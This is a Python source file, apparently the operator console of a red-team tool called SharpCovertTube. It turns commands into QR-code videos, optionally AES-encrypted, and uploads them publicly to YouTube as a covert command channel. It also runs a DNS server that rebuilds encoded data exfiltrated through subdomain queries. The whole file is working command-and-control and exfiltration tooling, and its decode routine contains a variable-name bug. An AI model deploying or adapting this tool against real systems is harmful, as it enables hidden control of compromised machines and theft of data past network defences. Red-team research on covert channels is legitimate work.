#!/usr/bin/env python3
from youtube_upload.client import YoutubeUploader
from Crypto.Cipher import AES
from dnslib import DNSRecord
from glob import glob
import datetime
import base64
import socket
import rebus
import cv2
import sys
import re
import os
import config


def aes_decrypt(encrypted_message, aes_key, aes_iv):
	rebus_decoded = rebus.b64decode(encrypted_message.encode('utf-8'))
	encrypted_message = base64.b64decode(rebus_decoded)
	BS = 16
	unpad = lambda s: s[:-s[-1]]
	aes_key_bytes = str.encode(aes_key)
	iv_bytes = str.encode(aes_iv)
	cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv_bytes)
	raw = cipher.decrypt(encrypted_message)
	message = unpad(raw).decode('utf-8')
	return message


def aes_encrypt(message, aes_key, aes_iv):
	message = message.encode()
	BS = 16
	pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
	raw = pad(message)
	aes_key_bytes = str.encode(aes_key)
	iv_bytes = str.encode(aes_iv)
	cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv_bytes)
	enc = cipher.encrypt(raw)
	rebus_encoded = rebus.b64encode(base64.b64encode(enc).decode('utf-8'))
	return rebus_encoded.decode("utf-8")


def decode_base64(encoded_str):
	aes_key = config.aes_key
	aes_iv =  config.aes_iv
	try:
		decoded_string = base64.b64decode(encoded_str).decode("utf-8")
		try:
			decrypted_str = aes_decrypt(decoded_str, aes_key, aes_iv)
			return decrypted_str
		except:
			pass
		return decoded_string
	except:
		pass
	try:
		decoded_string = base64.b64decode(encoded_str+"=").decode("utf-8")
		try:
			decrypted_str = aes_decrypt(decoded_str, aes_key, aes_iv)
			return decrypted_str
		except:
			pass
		return decoded_string
	except:
		pass
	try:
		decoded_string = base64.b64decode(encoded_str+"==").decode("utf-8")
		try:
			decrypted_str = aes_decrypt(decoded_str, aes_key, aes_iv)
			return decrypted_str
		except:
			pass
		return decoded_string
	except:
		pass
	return ""


def listener(ns_subdomain, log_file):
	print("[+] Monitoring DNS queries for subdomain " + ns_subdomain)
	print("[+] Storing queries in " + log_file)

	log_entries = []
	subdomain_base64_aux = ""
	counter = 0

	while True:
		try:
			server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			server.bind(('0.0.0.0', 53))
			server.settimeout(5)
			data, addr = server.recvfrom(4096)
			d = DNSRecord.parse(data)
			subdomain = str(d.questions[0]._qname).split(ns_subdomain)[0]

			now = datetime.datetime.now()
			current_time = now.strftime(f"%H:%M")
			log_entry = current_time + " " + subdomain
			one_min_ago = now - datetime.timedelta(minutes=1)
			one_min_ago_time = one_min_ago.strftime(f"%H:%M")
			log_entry_one_min_ago = one_min_ago_time + " " + subdomain

			# Note: I only log DNS queries not repeated in the last minute, if you want more you can uncomment the else statement but queries will be redundant
			if log_entry not in log_entries and log_entry_one_min_ago not in log_entries:
				if( (counter >= 4) and (subdomain_base64_aux != "") ):
					subdomain_base64_aux = ""
					counter = 0
				# Log entry
				subdomain_base64_aux += subdomain
				print("[+] Log entry:    \t" + log_entry)
				log_entries.append(log_entry)
				f = open(log_file, "a")
				f.write(log_entry + "\n")
				f.close()
				# Decode subdomain if possible
				print("[+] Encoded string:\t" + subdomain_base64_aux)
				decoded_str = decode_base64(subdomain_base64_aux)
				if decoded_str != "":
					print("[+] Result: \n" + decoded_str)

		except socket.timeout:
			if subdomain_base64_aux != "":
				counter += 1
			pass
		except KeyboardInterrupt:
			server.close()
			main_loop()
		except Exception as e:
			print("Unexpected exception: " + str(e))
			break

		server.close()


def generate_frames(image_type, command, aes_key, aes_iv):
	if image_type == "qr":
		import pyqrcode
		qrcode = pyqrcode.create(command,version=10)
		qrcode.png("image.png",scale=8)
	elif image_type == "qr_aes":
		import pyqrcode
		encrypted_cmd = aes_encrypt(command,aes_key, aes_iv)
		print("[+] AES-encrypted value: "+encrypted_cmd)
		qrcode = pyqrcode.create(encrypted_cmd,version=10)
		qrcode.png("image.png",scale=8)
	else:
		print("Unknown type")
	return 1


def create_file(video_file):
	img_array = []
	natsort = lambda s: [int(t) if t.isdigit() else t.lower() for t in re.split(r'(\d+)', s)]
	for filename in sorted(glob('*.png'), key=natsort):
		img = cv2.imread(filename)
		height, width, layers = img.shape
		size = (width,height)
		img_array.append(img)
		img_array.append(img)
		img_array.append(img)
		img_array.append(img)
		fps = 1
		out = cv2.VideoWriter(video_file,cv2.VideoWriter_fourcc(*'DIVX'), fps, size)
	for i in range(len(img_array)):
		out.write(img_array[i])
	out.release()


def generate_video(image_type, video_file, aes_key, aes_iv, command):
	generate_frames(image_type, command, aes_key, aes_iv)
	if not video_file.endswith(".avi"):
		video_file += ".avi"
	print("[+] Creating file in the path "+video_file+"\n")
	create_file(video_file)
	os.remove("image.png")


def upload_video(video_name):
	client_id = config.client_id
	client_secret = config.client_secret
	access_token_  = config.access_token_
	refresh_token_ = config.refresh_token_

	if (client_id == "" or client_secret == "" or access_token_ == "" or refresh_token_ == ""):
		print("[-] Some values are missing in config.py file\n")
		main_loop()
	print("[+] Uploading video...")
	uploader = YoutubeUploader(client_id, client_secret)
	uploader.authenticate(access_token=access_token_, refresh_token=refresh_token_)
	# Video options
	options = {
	    "title" : "Test -" + video_name,
	    "description" : "SharpCovertTube test",
	    "tags" : ["sharpcoverttube"],
	    "categoryId" : "22",
	    "privacyStatus" : "public",
	    "kids" : False,
	}
	uploader.upload(video_name, options)
	uploader.close()
	os.remove(video_name)
	print("[+] Video uploaded\n")


def showHelp():
	print("Options: \n - \"generate\": \tCreate a QR video \n - \"upload\": \tUpload a video to Youtube \n - \"listen\": \tListen for DNS queries \n - \"exit\": \tExit the program \n")


def main_loop():
	while True:
		option = input("> ")
		if option == "generate":
			command_ = input("[+] Command: ")
			type_ = input("[+] Type (\"qr\" or \"qr_aes\"): ")
			if (type_ != "qr" and type_ != "qr_aes"):
				print("[-] Type value must be \"qr\" or \"qr_aes\"\n")
				main_loop()
			aeskey = ""
			aesiv  = ""
			if type_ == "qr_aes":
				aeskey = input("[+] AES key (example: \"0000000000000000\"): ")
				if(len(aeskey) % 16 != 0):
	                                print("[-] AES key length must be multiple of 16.")
	                                main_loop()
				aesiv = input("[+] AES IV (example: \"0000000000000000\"): ")
				if(len(aesiv) % 16 != 0):
	                                print("[-] IV length must be multiple of 16.")
	                                main_loop()
			file_ = input("[+] Video file name: ")
			generate_video(type_, file_, aeskey, aesiv, command_)
		elif option == "upload":
			file_ = input("[+] Video file name: ")
			upload_video(file_)
		elif option == "listen":
			ns_subdomain = config.ns_subdomain
			log_file = config.log_file
			listener(ns_subdomain, log_file)
		elif option == "exit":
			sys.exit(0)
		else:
			print("")
			showHelp()


def showBanner():
	print("  ___  _                       ___                      _   _____       _         ")
	print(" / __|| |_   __ _  _ _  _ __  / __| ___ __ __ ___  _ _ | |_|_   _|_  _ | |__  ___ ")
	print(" \\__ \\| ' \\ / _` || '_|| '_ \\| (__ / _ \\\\ V // -_)| '_||  _| | | | || || '_ \\/ -_)")
	print(" |___/|_||_|\\__,_||_|  | .__/ \\___|\\___/ \\_/ \\___||_|   \\__| |_|  \\_,_||_.__/\\___|")
	print("                       |_|                                     by @ricardojoserf  ")
	showHelp()


def main():
	if config.show_banner:
		showBanner()
	main_loop()


if __name__== "__main__":
	main()